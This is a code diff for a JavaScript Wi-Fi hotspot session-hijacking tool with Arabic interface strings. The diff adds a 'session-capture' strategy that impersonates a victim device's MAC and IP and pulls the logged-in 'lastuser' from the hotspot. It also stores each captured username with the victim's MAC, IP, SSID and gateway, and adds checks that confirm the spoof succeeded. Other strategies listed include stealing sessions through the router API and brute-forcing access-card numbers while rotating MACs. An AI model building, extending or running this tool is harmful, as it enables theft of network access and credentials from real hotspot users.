@@ -19,14 +19,16 @@ const STRATEGIES = {
   API_SESSION: 'api-session',
   BRUTE_FORCE: 'brute-force',
   SMART_AUTO: 'smart-auto',
+  SESSION_CAPTURE: 'session-capture',
 };
 
 const STRATEGY_LABELS = {
-  'session-wait': { icon: '⏳', label: 'انتظار الجلسة', description: 'انتحال MAC وانتظار تفعيل الجلسة (الأصلية)' },
-  'card-login': { icon: '💳', label: 'تسجيل الدخول بالكروت', description: 'استخدام كرت متاح لتسجيل الدخول' },
-  'api-session': { icon: '📡', label: 'API الراوتر', description: 'استخدام API الراوتر لسرقة الجلسة' },
-  'brute-force': { icon: '⚡', label: 'تخمين الكروت', description: 'تخمين أرقام الكروت مع تدوير MAC' },
-  'smart-auto': { icon: '🧠', label: 'ذكي', description: 'تجربة جميع الاستراتيجيات بالتسلسل' },
+  'session-wait':    { icon: '⏳', label: 'انتظار الجلسة', description: 'انتحال MAC وانتظار تفعيل الجلسة (الأصلية)' },
+  'card-login':      { icon: '💳', label: 'تسجيل الدخول بالكروت', description: 'استخدام كرت متاح لتسجيل الدخول' },
+  'api-session':     { icon: '📡', label: 'API الراوتر', description: 'استخدام API الراوتر لسرقة الجلسة' },
+  'brute-force':     { icon: '⚡', label: 'تخمين الكروت', description: 'تخمين أرقام الكروت مع تدوير MAC' },
+  'smart-auto':      { icon: '🧠', label: 'ذكي', description: 'تجربة جميع الاستراتيجيات بالتسلسل' },
+  'session-capture': { icon: '🎯', label: 'اقتناص الجلسة', description: 'انتحال الهوية وجلب الـ lastuser مباشرة' },
 };
 
 const progressEmitter = new EventEmitter();
@@ -106,7 +108,7 @@ function emitLog(message, type = 'info') {
   else logger.info(`[UI] ${message}`);
 }
 
-async function detectHotspot(gatewayIp) {
+async function detectHotspot(gatewayIp, ssid, victimMac, victimIp) {
   const configUrl = hotspotAuth.getConfig().url;
   const tryUrls = [
     configUrl,
@@ -141,7 +143,7 @@ async function detectHotspot(gatewayIp) {
     if (found.value.sessionActive && found.value.data) {
       const lastuser = credentialCapture.parseLastuser(found.value.data);
       if (lastuser) {
-        credentialCapture.addCredential(lastuser, { source: 'hijack-detect', hotspotUrl: found.value.url, gatewayIp: gatewayIp });
+        credentialCapture.addCredential(lastuser, { source: 'hijack-detect', hotspotUrl: found.value.url, victimMac: victimMac || '', victimIp: victimIp || '', ssid: ssid || '', gatewayIp: gatewayIp });
         emitLog(`👤 تم اكتشاف lastuser: ${lastuser}`, 'success');
       }
     }
@@ -151,7 +153,7 @@ async function detectHotspot(gatewayIp) {
   return { found: false, url: null, sessionActive: false, reason: `فشلت كل الـ URLs (${tryUrls.length})` };
 }
 
-async function checkSessionViaStatus(baseUrl, maxAttempts = 5) {
+async function checkSessionViaStatus(baseUrl, maxAttempts = 5, extra = {}) {
   const statusUrl = baseUrl.replace(/\/+$/, '').replace(/\/index\.html$/, '') + '/status';
   for (let i = 0; i < maxAttempts; i++) {
     await sleep(500);
@@ -163,7 +165,7 @@ async function checkSessionViaStatus(baseUrl, maxAttempts = 5) {
         emitLog(`✅ الرد من ${statusUrl} ← HTTP ${resp.status} (${html.length}b) — [جلسة نشطة] ${snippet}`);
         const lastuser = credentialCapture.parseLastuser(html);
         if (lastuser) {
-          credentialCapture.addCredential(lastuser, { source: 'hijack-session-wait', hotspotUrl: baseUrl });
+          credentialCapture.addCredential(lastuser, { source: 'hijack-session-wait', hotspotUrl: baseUrl, victimMac: extra.victimMac || '', victimIp: extra.victimIp || '', ssid: extra.ssid || '', gatewayIp: extra.gatewayIp || '' });
           emitLog(`👤 تم اكتشاف lastuser: ${lastuser}`, 'success');
         }
         return { sessionActive: true, remainBytes: 'available', httpStatus: resp.status, bodyLength: html.length };
@@ -671,9 +673,60 @@ const sessionHijack = {
         emitLog(`⚠️ فحص الاتصال: ${e.message.slice(0, 150)}`);
       }
 
+      const verifyMac = async () => {
+        try {
+          const cur = await wifiManager.getCurrentMac();
+          const curNorm = cur.replace(/[:-]/g, '').toUpperCase();
+          const tgtNorm = targetMac.replace(/[:-]/g, '').toUpperCase();
+          const tgtLaa = ((parseInt(tgtNorm.substring(0, 2), 16) | 0x02) & 0xFE).toString(16).toUpperCase() + tgtNorm.substring(2);
+          return curNorm === tgtNorm || curNorm === tgtLaa;
+        } catch { return false; }
+      };
+      const verifyIp = async () => {
+        try {
+          const { execFileSync } = require('child_process');
+          const out = execFileSync('powershell', ['-NoProfile', '-Command',
+            '(Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias (Get-NetAdapter -Physical|Where-Object{$_.Name -match "Wi.Fi|Wireless|WLAN|802.11"}|Select-Object -First 1).Name -ErrorAction SilentlyContinue).IPAddress'
+          ], { timeout: 5000, encoding: 'utf-8' });
+          const ip = (out || '').trim();
+          return ip === targetIp || ip.startsWith(targetIp);
+        } catch { return false; }
+      };
+
+      emitStep('verify_mac_ip', 'running');
+      emitLog(`🔍 التحقق من MAC و IP...`);
+      const [macOk, ipOk] = await Promise.all([verifyMac(), options.forceIp ? verifyIp() : Promise.resolve(false)]);
+
+      if (macOk && (!options.forceIp || ipOk)) {
+        emitLog(`✅✅✅ اختراق ناجح! MAC=${targetMac}${options.forceIp ? ' IP=' + options.forceIp : ''}`, 'success');
+        emitStep('verify_mac_ip', 'done', { mac: macOk, ip: ipOk });
+        hijackProgress.progress = 90;
+        try {
+          const { quickCheck } = require('./wifi-manager');
+          const q = await quickCheck();
+          credentialCapture.addCredential('(hijacked:' + targetMac.replace(/:.*/, '') + '...)', {
+            source: 'hijack-mac-ip-spoof',
+            victimMac: targetMac, victimIp: targetIp,
+            ssid: (q && q.ssid) || options.ssid || '',
+            gatewayIp: gatewayIp || options.forceGateway || '',
+            remainingBytes: null, remainingTime: null,
+          });
+        } catch {}
+        return complete(true, { sessionActive: true, method: 'mac-ip-spoof', macVerified: macOk, ipVerified: ipOk }, null, strategy);
+      }
+
+      if (!macOk) {
+        emitLog(`❌ MAC غير متطابق — فشل الانتحال`, 'error');
+        emitStep('verify_mac_ip', 'failed', { mac: false });
+        return complete(false, null, null, strategy);
+      }
+
+      emitLog(`⚠️ MAC متطابق لكن IP فشل — محاولة الهوتسبوت`, 'warn');
+
+      const currentSsid = options.ssid || '';
       emitStep('detect_hotspot', 'running');
       const detectedHotspot = await Promise.race([
-        detectHotspot(gatewayIp),
+        detectHotspot(gatewayIp, currentSsid, targetMac, targetIp),
         sleep(15000).then(() => { emitLog(`⚠️ انتهت مهلة فحص الهوتسبوت`, 'warn'); return { found: false }; }),
       ]);
 
@@ -702,7 +755,7 @@ const sessionHijack = {
       if (strategy === 'session-wait') {
         const waitSec = config?.hijack?.sessionWaitMaxSec || 35;
         emitLog(`⏳ انتظار الجلسة لمدة ${waitSec} ثانية...`);
-        const waitResult = await checkSessionViaStatus(detectedHotspot.url, waitSec);
+        const waitResult = await checkSessionViaStatus(detectedHotspot.url, waitSec, { victimMac: targetMac, victimIp: targetIp, ssid: currentSsid, gatewayIp: gatewayIp });
         finalResult = { success: waitResult.sessionActive, sessionInfo: waitResult };
       } else if (strategy === 'card-login') {
         emitLog(`💳 تجربة الكروت المتاحة...`);
